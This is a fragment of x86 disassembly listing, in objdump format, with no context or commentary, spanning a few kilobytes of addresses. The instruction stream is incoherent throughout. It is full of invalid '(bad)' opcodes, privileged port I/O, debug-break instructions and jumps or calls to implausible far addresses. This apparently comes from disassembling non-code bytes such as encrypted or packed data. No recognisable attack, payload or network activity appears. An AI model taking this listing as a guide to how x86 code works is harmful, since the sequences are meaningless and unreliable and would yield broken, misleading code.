  427d83:	add    DWORD PTR [ebx+0x4e7eae0],edi
  427d89:	retf   0xe7e2
  427d8c:	loop   0x427d86
  427d8e:	fsubr  st,st(4)
  427d90:	stos   BYTE PTR es:[edi],al
  427d91:	icebp  
  427d92:	out    0xf2,al
  427d94:	(bad)  
  427d95:	leave  
  427d96:	cmc    
  427d97:	xlat   BYTE PTR ds:[ebx]
  427d98:	out    0xce,eax
  427d9a:	ror    al,1
  427d9c:	mov    ecx,0xbe01fad3
  427da1:	cmc    
  427da2:	int    0xf7
  427da4:	cld    
  427da5:	in     al,dx
  427da6:	repz add ebp,ecx
  427da9:	enter  0xde04,0xed
  427dad:	int    0xc4
  427daf:	adc    esi,DWORD PTR [ecx-0x16283714]
  427db5:	vpand  xmm6,xmm2,XMMWORD PTR [ebx+esi*8-0x11440b19]
  427dbe:	fstp   st(5)
  427dc0:	(bad)  
  427dc1:	cmc    
  427dc2:	imul   dh
  427dc4:	mov    esp,0xd600e5fb
  427dc9:	(bad)  
  427dca:	retf   
  427dcb:	sti    
  427dcc:	push   es
  427dcd:	add    BYTE PTR [edi],cl
  427dcf:	pop    es
  427dd0:	(bad)  
  427dd1:	test   eax,0xe4e7cccd
  427dd6:	aam    0xb2
  427dd8:	neg    bl
  427dda:	rcr    eax,cl
  427ddc:	mov    edx,0xf5dcf8ed
  427de1:	add    dl,al
  427de3:	hlt    
  427de4:	icebp  
  427de5:	in     eax,0xea
  427de7:	sti    
  427de8:	sar    eax,1
  427dea:	aad    0x4
  427dec:	jmp    0x427ddc
  427dee:	lds    edx,FWORD PTR [ecx]
  427df0:	loope  0x427dbe
  427df2:	shr    DWORD PTR [ebp-0x191e3a09],1
  427df8:	int3   
  427df9:	fcmovnbe st,st(2)
  427dfb:	iret   
  427dfc:	cld    
  427dfd:	fcmovu st,st(2)
  427dff:	fpatan 
  427e01:	mov    esi,0xd2dd06d9
  427e06:	in     al,0xe5
  427e08:	call   0xc74b57e8
  427e0d:	loop   0x427de9
  427e0f:	jmp    0x427dd2
  427e11:	mov    esp,0xb7f6e8b2
  427e16:	rcr    ecx,0xaf
  427e19:	mov    ch,0xee
  427e1b:	out    dx,eax
  427e1c:	in     eax,0xf2
  427e1e:	(bad)  
  427e1f:	mov    edx,0x1fbe1e8
  427e24:	in     al,0xe2
  427e26:	shl    ch,0xe3
  427e29:	stc    
  427e2a:	loope  0x427e11
  427e2c:	enter  0xdfde,0xc0
  427e30:	ret    
  427e31:	out    0xb0,eax
  427e33:	int3   
  427e34:	out    0xd1,eax
  427e36:	retf   
  427e37:	out    0xf5,al
  427e39:	ror    bh,1
  427e3b:	mov    eax,0xd2eedfeb
  427e40:	(bad)  
  427e42:	ror    esi,1
  427e44:	shl    esp,1
  427e46:	std    
  427e47:	std    
  427e48:	fmulp  st(1),st
  427e4a:	jmp    0x10074730
  427e4f:	loop   0x427e44
  427e51:	in     al,dx
  427e52:	out    0xad,eax
  427e54:	jmp    0xe9e5:0xf8e5eddc
  427e5b:	aam    0xf8
  427e5d:	aam    0xe3
  427e5f:	lock enter 0x301,0xbd
  427e64:	ror    esp,1
  427e66:	std    
  427e67:	fsubp  st(3),st
  427e69:	in     eax,0x5
  427e6b:	fdiv   st(4),st
  427e6d:	in     al,dx
  427e6e:	fnclex 
  427e70:	mov    ecx,0xf4eaddbf
  427e75:	loop   0x427e2e
  427e77:	stc    
  427e78:	mov    al,0xd0
  427e7a:	retf   0xd7eb
  427e7d:	jecxz  0x427e5a
  427e7f:	std    
  427e80:	cld    
  427e81:	jmp    ebx
  427e83:	mov    DWORD PTR [eax],0xd1dcc1d7
  427e89:	clc    
  427e8a:	pop    es
  427e8b:	add    esp,ebx
  427e8d:	jecxz  0x427e6b
  427e8f:	or     eax,0xc3e5ecd9
  427e94:	jmp    0x427e64
  427e96:	in     eax,dx
  427e97:	sti    
  427e98:	mov    dl,0xcd
  427e9a:	mov    cl,0xd3
  427e9c:	enter  0xfecc,0xfb
  427ea0:	stc    
  427ea1:	inc    DWORD PTR [edi]
  427ea3:	shl    dl,0xff
  427ea6:	aam    0xf0
  427ea8:	fdiv   st,st(0)
  427eaa:	rol    DWORD PTR ds:0xdd03fc06,0xc2
  427eb1:	shr    esp,0xc5
  427eb4:	stos   DWORD PTR es:[edi],eax
  427eb5:	repnz mov bl,0xef
  427eb8:	bnd jmp 0xe02b5976
  427ebe:	fsubrp st(2),st
  427ec0:	add    ebx,edi
  427ec2:	neg    esp
  427ec4:	in     al,0xd7
  427ec6:	add    ebx,ebx
  427ec8:	in     eax,0xbe
  427eca:	or     al,bh
  427ecc:	or     DWORD PTR [ecx+eax*1],eax
  427ecf:	or     cl,ch
  427ed1:	lods   al,BYTE PTR ds:[esi]
  427ed2:	into   
  427ed3:	jmp    0x427e84
  427ed5:	mov    al,0xb0
  427ed7:	xlat   BYTE PTR ds:[ebx]
  427ed8:	retf   
  427ed9:	iret   
  427eda:	mov    ebx,0xd5ebd5ba
  427edf:	fcmove st,st(5)
  427ee1:	cli    
  427ee2:	aam    0xd7
  427ee4:	neg    eax
  427ee6:	ret    0xf8d8
  427ee9:	sti    
  427eea:	test   al,0xea
  427eed:	in     al,0xe5
  427eef:	call   0xf42872b2
  427ef4:	scas   al,BYTE PTR es:[edi]
  427ef5:	lods   al,BYTE PTR ds:[esi]
  427ef6:	retf   
  427ef7:	jmp    0xb70243ac
  427efc:	jmp    0xca1f5bd0
  427f01:	icebp  
  427f02:	add    esp,esi
  427f04:	stc    
  427f05:	pop    es
  427f06:	ffree  st(7)
  427f08:	(bad)  
  427f09:	jmp    0x50b:0xeedbd8ff
  427f10:	retf   0xc9c3
  427f13:	jmp    0xad3436e1
  427f18:	mov    cl,0xf9
  427f1a:	retf   0xeadb
  427f1d:	fcmovbe st,st(3)
  427f1f:	int3   
  427f20:	sti    
  427f21:	enter  0xc2d2,0xdf
  427f25:	rcl    ecx,1
  427f27:	add    ebx,esi
  427f29:	fcmovu st,st(5)
  427f2b:	(bad)  
  427f2c:	in     al,0xff
  427f2e:	add    BYTE PTR [ecx],al
  427f30:	lock mov edi,0xd5c9bce8
  427f36:	icebp  
  427f37:	out    0xd0,eax
  427f39:	call   0xbe1a533c
  427f3e:	ret    
  427f3f:	iret   
  427f40:	lock mov ebp,0xc1e0f1cc
  427f46:	fld    DWORD PTR [ebx+ecx*8]
  427f49:	or     DWORD PTR [esp+esi*8],eax
  427f4c:	or     eax,0xcf130804
  427f51:	enter  0xc7ea,0xc5
  427f55:	jmp    0xd8fb:0xc8b7b6ce
  427f5c:	aam    0xe3
  427f5e:	mov    ch,0xd3
  427f60:	(bad)  
  427f61:	loop   0x427f18
  427f63:	loop   0x427f39
  427f65:	fcmovu st,st(4)
  427f67:	mov    eax,0xe0de0309
  427f6c:	pop    es
  427f6d:	add    eax,0xddabffed
  427f72:	ror    ebx,0xd2
  427f75:	out    0xf7,eax
  427f77:	rol    cl,1
  427f79:	retf   
  427f7a:	into   
  427f7b:	fdivr  DWORD PTR [ecx-0x26022c06]
  427f81:	out    0xdb,eax
  427f83:	ret    0xe6d9
  427f86:	(bad)
  427f89:	add    ah,ah
  427f8b:	loop   0x427f96
  427f8d:	loopne 0x427f54
  427f8f:	fnstenv [edx-0x1608523a]
  427f95:	leave  
  427f96:	lods   al,BYTE PTR ds:[esi]
  427f97:	in     al,0xe1
  427f99:	repnz rcr edx,1
  427f9c:	xlat   BYTE PTR ds:[ebx]
  427f9d:	add    ebp,esp
  427f9f:	(bad)  
  427fa1:	pop    es
  427fa2:	sti    
  427fa3:	repz add BYTE PTR ds:0xc6c9f8d8,al
  427faa:	(bad)  
  427fab:	out    dx,eax
  427fac:	add    eax,ebp
  427fae:	add    al,BYTE PTR [ecx]
  427fb0:	out    0xdd,eax
  427fb2:	in     eax,0xc3
  427fb4:	loope  0x427f99
  427fb6:	ret    0xf2b3
  427fb9:	fucomip st,st(0)
  427fbb:	jmp    0xe92e7494
  427fc0:	not    esi
  427fc2:	add    ebp,ecx
  427fc4:	out    0xd8,eax
  427fc6:	clc    
  427fc7:	(bad)  
  427fc8:	push   es
  427fc9:	ret    0xcfea
  427fcc:	cli    
  427fcd:	in     al,dx
  427fce:	out    0xcc,al
  427fd0:	(bad)  
  427fd1:	repz (bad) 
  427fd3:	lods   eax,DWORD PTR ds:[esi]
  427fd4:	aad    0xf0
  427fd6:	mov    bh,0xf6
  427fd8:	(bad)  
  427fd9:	fsub   st,st(5)
  427fdb:	xlat   BYTE PTR ds:[ebx]
  427fdc:	(bad)  
  427fdd:	retf   0xbbc3
  427fe0:	rcl    esi,cl
  427fe2:	ret    0xc2de
  427fe5:	repnz dec DWORD PTR [ebx]
  427fe8:	dec    BYTE PTR [ecx]
  427fea:	(bad)  
  427feb:	retf   
  427fec:	fsub   st(5),st
  427fee:	jmp    0xdcd2:0xacc6d8eb
  427ff5:	loope  0x427fe4
  427ff7:	aam    0xfa
  427ff9:	fcmovnb st,st(5)
  427ffb:	mov    esi,0xbab4c9c9
  428000:	(bad)  
  428001:	(bad)  
  428003:	in     eax,dx
  428004:	mov    ebx,0x3dee4bc
  428009:	out    dx,eax
  42800a:	faddp  st(5),st
  42800c:	stc    
  42800d:	into   
  42800e:	clc    
  42800f:	ror    esi,cl
  428011:	mov    al,0xcd
  428013:	div    DWORD PTR [ecx-0x3209293b]
  428019:	jmp    0x428000
  42801b:	mov    ecx,0xf1e3eccf
  428020:	repz fcmovbe st,st(3)
  428023:	fdivr  QWORD PTR [edi-0x271afc21]
  428029:	(bad)  
  42802b:	out    dx,al
  42802c:	std    
  42802d:	jmp    0xde2a6220
  428032:	out    dx,eax
  428033:	(bad)  
  428034:	aam    0xf2
  428036:	shr    dl,cl
  428038:	mov    dl,0xf2
  42803a:	shr    ch,1
  42803c:	retf   0xf9b5
  42803f:	jmp    0xf0e1:0xfff5d3fc
  428046:	not    dl
  428048:	push   es
  428049:	or     ch,al
  42804b:	aad    0xe
  42804d:	fdivp  st(6),st
  42804f:	icebp  
  428050:	leave  
  428051:	scas   eax,DWORD PTR es:[edi]
  428052:	in     al,dx
  428053:	icebp  
  428054:	mov    bh,0xc5
  428056:	shl    BYTE PTR [ecx-0x4a4a0b31],cl
  42805c:	fmulp  st(2),st
  42805e:	mov    ebx,0xf9e302f8
  428063:	aam    0xe4
  428065:	sti    
  428066:	(bad)  
  428067:	(bad)  
  428068:	fsubr  st(1),st
  42806a:	cmc    
  42806b:	jecxz  0x428076
  42806d:	ficom  DWORD PTR [edx]
  42806f:	call   0xd3093326
  428074:	jmp    0x42803f
  428076:	mov    dh,0xf4
  428078:	(bad)
  42807c:	repz retf 0xbcdb
  428080:	call   0xc43f5b5b
  428085:	out    0xda,eax
  428087:	retf   
  428088:	inc    DWORD PTR [edx]
  42808a:	out    dx,eax
  42808b:	hlt    
  42808c:	fucom  st(4)
  42808e:	add    al,0xe5
  428090:	rcr    al,0xe8
  428093:	shr    DWORD PTR [ebx-0x350b1140],cl
  428099:	cli    
  42809a:	imul   esi
  42809c:	shl    DWORD PTR [esi-0x1c3c1e06],1
  4280a2:	(bad)  
  4280a4:	in     eax,0xd7
  4280a6:	ret    0xfade
  4280a9:	pop    es
  4280aa:	in     eax,0xf8
  4280ac:	retf   0xd3ed
  4280af:	or     ch,BYTE PTR [ebx-0xd433b1a]
  4280b5:	hlt    
  4280b6:	loope  0x4280a4
  4280b8:	out    0xda,al
  4280ba:	(bad)  
  4280bb:	in     al,dx
  4280bc:	call   0xb81475bb
  4280c1:	(bad)  
  4280c3:	(bad)  
  4280c4:	out    0xf6,al
  4280c6:	out    0xe3,al
  4280c8:	aam    0xe9
  4280ca:	out    dx,eax
  4280cb:	mov    esp,0xe1e9cfe0
  4280d0:	ret    0xbff7
  4280d3:	into   
  4280d4:	leave  
  4280d5:	mov    dh,0xc8
  4280d7:	mul    esp
  4280d9:	lock out 0xf6,al
  4280dc:	cmc    
  4280dd:	(bad)  
  4280de:	idiv   DWORD PTR [edi+edi*4+0x5eee6fd]
  4280e5:	add    bl,ch
  4280e7:	add    eax,esi
  4280e9:	fucom  st(2)
  4280eb:	add    al,BYTE PTR [esi]
  4280ed:	push   cs
  4280ee:	(bad)  
  4280f0:	lods   al,BYTE PTR ds:[esi]
  4280f1:	rol    ebx,cl
  4280f3:	cmc    
  4280f4:	rep lods eax,DWORD PTR ds:[esi]
  4280f6:	xlat   BYTE PTR ds:[ebx]
  4280f7:	out    0xf0,al
  4280f9:	shl    edx,cl
  4280fb:	repz in eax,0xdd
  4280fe:	mov    eax,0xf301dbd9
  428103:	std    
  428104:	cmc    
  428105:	les    eax,FWORD PTR [ecx]
  428107:	sti    
  428108:	aad    0xe6
  42810a:	clc    
  42810b:	str    WORD PTR [edi]
  42810e:	(bad)  
  42810f:	loop   0x4280f7
  428111:	xlat   BYTE PTR ds:[ebx]
  428112:	call   0xf5ef6df4
  428117:	mov    bh,0xb7
  428119:	sti    
  42811a:	mov    dh,0xf0
  42811c:	hlt    
  42811d:	icebp  
  42811e:	fcmovu st,st(1)
  428120:	mov    esp,0x2c7f7bc
  428125:	rcr    ebp,1
  428127:	in     al,0xda
  428129:	femms  
  42812b:	out    dx,eax
  42812c:	pop    es
  42812d:	or     cl,bh
  42812f:	or     al,0xab
  428131:	test   al,0xe7
  428133:	mov    cl,0xd0
  428135:	ret    
  428136:	jmp    0xfa3e4300
  42813b:	mov    ebx,0xfaecf0b3
  428140:	iret   
  428141:	(bad)  
  428143:	ret    0xc0ed
  428146:	mov    ebp,0xfbe5defb
  42814b:	add    DWORD PTR [eax*8-0xc513022],eax
  428152:	shl    BYTE PTR [esp+ebx*8-0x3a2d0b4c],0xb9
  42815a:	repz (bad) 
  42815d:	xlat   BYTE PTR ds:[ebx]
  42815e:	cld    
  42815f:	hlt    
  428160:	(bad)  
  428161:	sti    
  428162:	ret    
  428163:	std    
  428164:	loop   0x428129
  428166:	(bad)  
  428167:	retf   
  428168:	or     bh,ch
  42816a:	cli    
  42816b:	or     ecx,ecx
  42816d:	jmp    0x428157
  42816f:	cli    
  428170:	shr    BYTE PTR [ebp-0x1612192a],cl
  428176:	loopne 0x42816d
  428178:	(bad)  
  428179:	in     al,0xf5
  42817b:	rcr    ch,cl
  42817d:	std    
  42817e:	add    edi,DWORD PTR [ebp-0x41231842]
  428184:	cmc    
  428185:	rcl    ebp,0xd0
  428188:	add    ah,dl
  42818a:	vpsrad ymm1,ymm4,xmm0
  42818e:	shl    ebx,0xd1
  428191:	out    dx,al
  428192:	retf   0xf3c8
  428195:	mov    al,0xe8
  428197:	call   0xe50b4e91
  42819c:	shl    BYTE PTR [ebp+0x7c2d8d8],1
  4281a2:	mov    eax,0xe5def8df
  4281a7:	imul   bl
  4281a9:	or     esp,ebp
  4281ab:	retf   0xe0db
  4281ae:	int    0x3
  4281b0:	stos   BYTE PTR es:[edi],al
  4281b1:	ffree  st(6)
  4281b3:	out    dx,al
  4281b4:	imul   esi
  4281b6:	mov    dl,0xcb
  4281b8:	in     eax,dx
  4281b9:	mov    dl,0xf3
  4281bb:	(bad)  [edi-0x2b3c3617]
  4281c1:	mov    edx,0xecbbede2
  4281c6:	clc    
  4281c7:	loopne 0x4281d4
  4281c9:	enter  0xd4e2,0x3
  4281cd:	add    ebp,ebp
  4281cf:	cli    
  4281d0:	fisubr WORD PTR [esp+ebp*4-0x10490d5c]
  4281d7:	out    0xd3,al
  4281d9:	fbstp  TBYTE PTR [edi-0x733281b]
  4281df:	lock shl esp,cl
  4281e2:	hlt    
  4281e3:	cld    
  4281e4:	mov    esi,0xf8f0e6f1
  4281e9:	leave  
  4281ea:	push   es
  4281eb:	add    ch,bh
  4281ed:	int    0x7
  4281ef:	retf   0xb3aa
  4281f2:	loope  0x4281a0
  4281f4:	lock jecxz 0x4281bb
  4281f7:	mov    ch,0xfb
  4281f9:	leave  
  4281fa:	lods   eax,DWORD PTR ds:[esi]
  4281fb:	mov    al,0xe4
  4281fd:	mov    dl,0xc3
  4281ff:	(bad)  
  428201:	iret   
  428202:	rcr    edx,cl
  428204:	inc    ah
  428206:	push   es
  428207:	inc    ch
  428209:	jmp    0x4281e7
  42820b:	add    al,0xfb
  42820d:	out    0xa,al
  42820f:	add    al,0xce
  428211:	leave  
  428212:	mov    ebp,0xd2c3edeb
  428218:	aam    0xcd
  42821a:	int3   
  42821b:	(bad)  
  42821c:	fcmovb st,st(4)
  42821e:	jmp    0xb91e771f
  428223:	loope  0x42821a
  428225:	xlat   BYTE PTR ds:[ebx]
  428226:	loopne 0x4281e9
  428228:	(bad)  
  428229:	hlt    
  42822a:	(bad)  
  42822b:	sti    
  42822c:	sti    
  42822d:	add    eax,DWORD PTR [edx+esi*8]
  428230:	jmp    0xd8005efb
  428235:	call   0x304c0d
  42823a:	test   al,0xb7
  42823d:	clc    
  42823e:	clc    
  42823f:	clc    
  428240:	rcr    edi,cl
  428242:	lock loop 0x428225
  428245:	in     al,dx
  428246:	fld    QWORD PTR [ebx]
  428248:	ret    0xfa09
  42824b:	or     edx,ebp
  42824d:	dec    dl
  42824f:	in     eax,0xf1
  428251:	mov    esi,0xcab7efe5
  428256:	aam    0xe0
  428258:	out    dx,eax
  428259:	scas   al,BYTE PTR es:[edi]
  42825a:	fidiv  WORD PTR [ebx+esi*4-0x21fcfc2f]
  428261:	iret   
  428262:	int3   
  428263:	repnz shl ch,cl
  428266:	add    eax,0xfbc709c3
  42826b:	(bad)  
  42826c:	loop   0x42826b
  42826e:	adc    edx,DWORD PTR [ecx]
  428270:	mov    esi,0xadaeaff1
  428275:	int3   
  428276:	jmp    0xf41d756a
  42827b:	hlt    
  42827c:	hlt    
  42827d:	int3   
  42827e:	mov    ebx,0xd7f8d401
  428283:	icebp  
  428284:	fadd   st,st(1)
  428286:	(bad)
  42828a:	iret   
  42828b:	loope  0x428254
  42828d:	(bad)  
  42828f:	enter  0xdeac,0xdf
  428293:	mov    dl,0xf3
  428295:	aad    0xcb
  428297:	imul   bl
  428299:	ffreep st(6)
  42829b:	rcl    ebx,cl
  42829d:	call   edi
  42829f:	idiv   bl
  4282a1:	add    bh,BYTE PTR [ebp-0x2bf4443a]
  4282a7:	jmp    0x428286
  4282a9:	clc    
  4282aa:	add    al,0x0
  4282ac:	or     esi,esp
  4282ae:	loop   0x42829e
  4282b0:	stos   BYTE PTR es:[edi],al
  4282b1:	stos   BYTE PTR es:[edi],al
  4282b2:	(bad)  
  4282b3:	in     eax,0xd0
  4282b5:	retf   0xccb1
  4282b8:	stc    
  4282b9:	push   edi
  4282bb:	mov    ch,0xea
  4282bd:	sti    
  4282be:	int    0xcd
  4282c0:	in     eax,dx
  4282c1:	test   cl,0xf5
  4282c4:	loope  0x4282c2
  4282c6:	f2xm1  
  4282c8:	shl    ecx,1
  4282ca:	cli    
  4282cb:	(bad)  
  4282cc:	add    edx,ebx
  4282ce:	enter  0xcf12,0xcd
  4282d2:	scas   eax,DWORD PTR es:[edi]
  4282d3:	scas   eax,DWORD PTR es:[edi]
  4282d4:	out    0xf0,eax
  4282d6:	cmc    
  4282d7:	mov    ah,0xc5
  4282d9:	out    dx,eax
  4282da:	fidivr WORD PTR [edi-0xbfd2730]
  4282e0:	in     al,dx
  4282e1:	out    dx,al
  4282e2:	mov    ecx,0x2ddfff9
  4282e7:	pop    es
  4282e8:	out    0xd0,eax
  4282ea:	sti    
  4282eb:	les    ecx,FWORD PTR [edi]
  4282ed:	jmp    0xe6c9:0xf7ce0de5
  4282f4:	test   eax,0xd5e1b4e4
  4282fa:	(bad)  
  4282fb:	fxch   st(5)
  4282fd:	(bad)  
  4282fe:	hlt    
  4282ff:	int    0xe2
  428301:	(bad)  
  428302:	ret    0xc2dd
  428305:	icebp  
  428306:	mov    ebp,0xbfee4c3
  42830b:	psraw  mm7,mm3
  42830e:	repz push es
  428310:	out    dx,al
  428311:	out    0xe8,eax
  428313:	jecxz  0x428303
  428315:	(bad)  
  428316:	fucomi st,st(2)
  428318:	hlt    
  428319:	not    edx
  42831b:	jmp    0xfa3e81fc
  428320:	xlat   BYTE PTR ds:[ebx]
  428321:	rol    BYTE PTR [eax],cl
  428323:	hlt    
  428324:	out    0xd8,eax
  428326:	fldl2e 
  428328:	cmc    
  428329:	out    0xd9,eax
  42832b:	loopne 0x4282f2
  42832d:	(bad)  
  42832f:	in     eax,dx
  428330:	mov    cl,0xe1
  428332:	out    0xd6,al
  428334:	repz in eax,0xc9
  428337:	cli    
  428338:	mov    dh,0xd8
  42833a:	mov    dh,0xda
  42833c:	mov    ebx,0xfc01d4ea
  428341:	sar    ch,0xd9
  428344:	(bad)  
  428345:	xlat   BYTE PTR ds:[ebx]
  428346:	out    0xc5,al
  428348:	leave  
  428349:	ret    0xd5e6
  42834c:	or     bh,bh
  42834e:	int3   
  42834f:	push   eax
  428351:	out    0xe4,al
  428353:	enter  0xeaf7,0xfb
  428357:	ret    0xbae9
  42835a:	in     eax,0xf8
  42835c:	fxch   st(2)
  42835e:	in     al,dx
  42835f:	jmp    0xd201:0xe6bde1cf
  428366:	test   esp,0xfeca07c6
  42836c:	in     eax,dx
  42836d:	fcmovnu st,st(3)
  42836f:	or     BYTE PTR [edi-0x310d2f0f],ah
  428375:	sti    
  428376:	ror    edx,cl
  428378:	mov    ecx,0xedd4f3cb
  42837d:	fst    st(6)
  42837f:	jmp    0xb9125450
  428384:	icebp  
  428385:	fdiv   st(7),st
  428387:	hlt    
  428388:	or     ch,bl
  42838a:	(bad)  
  42838b:	out    0xdf,eax
  42838d:	pop    es
  42838e:	psubb  mm3,mm0
  428391:	repz test al,0xc6
  428394:	(bad)
  428397:	ret    0xb2e8
  42839a:	jmp    0x428384
  42839c:	(bad)  
  42839d:	sti    
  42839e:	iret   
  42839f:	hlt    
  4283a0:	mov    ecx,0xfffaf7e7
  4283a5:	ret    0x9e2
  4283a8:	clc    
  4283a9:	(bad)  
  4283ab:	jmp    0x428391
  4283ad:	aam    0xe2
  4283af:	jmp    0xb6f34f7f
  4283b4:	shr    DWORD PTR [esi-0x381f4557],0xb5
  4283bb:	retf   
  4283bc:	mov    ecx,0xf7ecffdb
  4283c1:	add    ecx,ebp
  4283c3:	fcmovnbe st,st(0)
  4283c5:	shl    eax,cl
  4283c7:	icebp  
  4283c8:	(bad)  
  4283c9:	out    0xa,eax
  4283cb:	out    0x5,eax
  4283cd:	(bad)  
  4283ce:	call   0xdff43da2
  4283d3:	xlat   BYTE PTR ds:[ebx]
  4283d4:	stos   DWORD PTR es:[edi],eax
  4283d5:	lods   eax,DWORD PTR ds:[esi]
  4283d6:	ret    
  4283d7:	loope  0x4283c4
  4283d9:	mov    dh,0xc8
  4283db:	retf   
  4283dc:	cmc    
  4283dd:	stc    
  4283de:	fld    DWORD PTR [edx]
  4283e0:	fsubrp st(7),st
  4283e2:	repz fdivr st,st(3)
  4283e5:	add    esi,eax
  4283e7:	mov    eax,0xf5c0fbd1
  4283ec:	or     DWORD PTR [ebx],ecx
  4283ee:	(bad)  
  4283ef:	retf   0xc8ae
  4283f2:	lock loopne 0x4283c9
  4283f5:	mov    bh,0xe5
  4283f7:	test   al,0xd4
  4283f9:	icebp  
  4283fa:	mov    bh,0xfa
  4283fc:	div    BYTE PTR [esi+esi*8-0x4a112202]
  428403:	add    eax,0xe4d7d1c5
  428408:	add    ah,ah
  42840a:	cmc    
  42840b:	into   
  42840c:	fcmovu st,st(6)
  42840e:	or     edi,ecx
  428410:	shl    DWORD PTR [esi-0x4a1f1738],cl
  428416:	loop   0x4283df
  428418:	mul    esi
  42841a:	(bad)  
  42841b:	sti    
  42841c:	call   0xe1135312
  428421:	ret    
  428422:	aad    0x1
  428424:	add    al,0xdf
  428426:	fmulp  st(2),st
  428428:	loope  0x428425
  42842a:	or     ch,bl
  42842c:	sti    
  42842d:	std    
  42842e:	into   
  42842f:	push   edx
  428431:	imul   edi
  428433:	call   0xf033682a
  428438:	mov    edx,0xeaecedf5
  42843d:	retf   
  42843e:	fdivrp st(1),st
  428440:	add    esp,ebp
  428442:	aad    0xcd
  428444:	sti    
  428445:	mov    esi,0xeadce4f8
  42844a:	cmc    
  42844b:	fsub   st(2),st
  42844d:	add    edx,esp
  42844f:	jecxz  0x428419
  428451:	ret    0xf5d1
  428454:	loope  0x42844d
  428456:	mov    esp,0xe4bab4d3
  42845c:	out    dx,al
  42845d:	iret   
  42845e:	fadd   st(2),st
  428460:	int    0x7
  428462:	fsin   
  428464:	repz rcr esi,cl
  428467:	(bad)  
  428469:	push   es
  42846a:	fcom   st(4)
  42846c:	in     eax,0xdc
  42846e:	std    
  42846f:	enter  0xe2c0,0xcc
  428473:	(bad)  
  428474:	(bad)  
  428475:	rcl    ch,0xf3
  428478:	hlt    
  428479:	in     al,dx
  42847a:	rcl    ch,1
  42847c:	(bad)  
  42847d:	retf   0xb0c9
  428480:	repnz mov edx,0xd1d5c207
  428486:	(bad)  
  428488:	(bad)  
  428489:	vpaddb xmm4,xmm6,xmm3
  42848d:	or     ecx,edi
  42848f:	add    al,0xec
  428491:	repnz mov al,0xe9
  428494:	bnd ret 
  428496:	(bad)  
  428498:	(bad)
  42849b:	clc    
  42849c:	retf   
  42849d:	call   0xf441417b
  4284a2:	mul    bl
  4284a4:	out    0xff,eax
  4284a6:	out    0xfd,eax
  4284a8:	out    0xa,eax
  4284aa:	xlat   BYTE PTR ds:[ebx]
  4284ab:	(bad)  
  4284ac:	add    ah,bl
  4284ae:	(bad)  
  4284b0:	mov    bl,0xec
  4284b2:	iret   
  4284b3:	mov    esi,0xf7cdb6e2
  4284b8:	test   dl,0xee
  4284bb:	hlt    
  4284bc:	in     eax,dx
  4284bd:	aam    0xb9
  4284bf:	cmc    
  4284c0:	add    bl,bh
  4284c2:	(bad)  
  4284c4:	mov    ebx,0xe5ebfde1
  4284c9:	add    bl,bl
  4284cb:	(bad)  
  4284cd:	hlt    
  4284ce:	out    0xe1,eax
  4284d0:	call   0xc2076d82
  4284d5:	shl    ah,0xcd
  4284d8:	(bad)
  4284db:	jmp    0xe4367ddb
  4284e0:	aad    0xbf
  4284e2:	mov    edi,0xc3d0c1da
  4284e7:	inc    DWORD PTR [ecx]
  4284e9:	in     al,0xe6
  4284eb:	iret   
  4284ec:	or     al,0xd9
  4284ee:	sti    
  4284ef:	stc    
  4284f0:	mov    ebp,0xf7d5cae2
  4284f5:	(bad)  
  4284f6:	enter  0xd3e2,0xcd
  4284fa:	int3   
  4284fb:	mov    bh,0xb8
  4284fd:	(bad)  
  4284ff:	rol    DWORD PTR [edx],cl
  428501:	cli    
  428502:	(bad)  
  428503:	cli    
  428504:	cli    
  428505:	mov    esp,0xc0fac605
  42850a:	mov    DWORD PTR [edi],0xf9cfc8e3
  428510:	jmp    0xe12174de
  428515:	shl    bh,0xb0
  428518:	iret   
  428519:	mov    dl,0xec
  42851b:	stc    
  42851c:	stc    
  42851d:	cli    
  42851e:	fcmovne st,st(2)
  428520:	rol    bl,cl
  428522:	hlt    
  428523:	int    0xbe
  428525:	icebp  
  428526:	stc    
  428527:	fucomip st,st(1)
  428529:	ffree  st(6)
  42852b:	cld    
  42852c:	lds    ecx,FWORD PTR [edx]
  42852e:	repz or al,cl
  428531:	shl    ah,1
  428533:	mov    bh,0xac
  428535:	loopne 0x428528
  428537:	repnz mov ecx,0xcdedbab7
  42853d:	cmc    
  42853e:	sti    
  42853f:	fnstcw WORD PTR [ebx-0x40093e44]
  428545:	mov    ebp,0xfead1d3
  42854a:	add    al,0xdb
  42854c:	ffree  st(5)
  42854e:	std    
  42854f:	shl    ch,cl
  428551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428552:	test   eax,0xdac3e2ac
  428557:	stc    
  428558:	int    0xfb
  42855a:	int3   
  42855b:	lock (bad) 
  42855d:	fucomp st(2)
  42855f:	(bad)  
  428561:	jecxz  0x428525
  428563:	add    eax,DWORD PTR ds:0xf0c607ec
  428569:	out    0xe2,eax
  42856b:	or     ecx,edi
  42856d:	add    al,0xce
  42856f:	icebp  
  428570:	lock repnz mov al,0xeb
  428574:	aam    0xc8
  428576:	out    dx,al
  428577:	(bad)  
  428578:	hlt    
  428579:	jmp    ebp
  42857b:	repz cmc 
  42857d:	stc    
  42857e:	mov    edi,0xfae2f6e8
  428583:	loope  0x428580
  428585:	(bad)  
  428586:	jecxz  0x428558
  428588:	or     eax,eax
  42858a:	aad    0xcb
  42858c:	fucom  st(5)
  42858e:	in     al,0xf
  428590:	scas   eax,DWORD PTR es:[edi]
  428591:	fisubr WORD PTR [eax-0x1b4f0b12]
  428597:	lock rcr edx,cl
  42859a:	hlt    
  42859b:	mov    al,0xf2
  42859d:	call   0xf0104f7c
  4285a2:	out    dx,eax
  4285a3:	icebp  
  4285a4:	(bad)  
  4285a6:	add    edi,esp
  4285a8:	stc    
  4285a9:	fcomip st,st(4)
  4285ab:	fmul   DWORD PTR [eax]
  4285ad:	std    
  4285ae:	in     al,dx
  4285af:	retf   
  4285b0:	lods   eax,DWORD PTR ds:[esi]
  4285b1:	icebp  
  4285b2:	mov    esi,0xc8d6d1ed
  4285b7:	int3   
  4285b8:	not    ecx
  4285ba:	sar    BYTE PTR [eax-0x150d0133],cl
  4285c0:	cli    
  4285c1:	rol    DWORD PTR [ecx],1
  4285c3:	ret    
  4285c4:	mov    esp,0xe4c5d9ff
  4285c9:	in     eax,0xc1
  4285cb:	pop    es
  4285cc:	push   es
  4285cd:	out    0xe2,al
  4285cf:	loop   0x428598
  4285d1:	lods   eax,DWORD PTR ds:[esi]
  4285d2:	fmulp  st(5),st
  4285d4:	rcr    bl,cl
  4285d6:	out    dx,eax
  4285d7:	iret   
  4285d8:	in     al,0xea
  4285da:	in     al,dx
  4285db:	retf   
  4285dc:	mov    bh,0xec
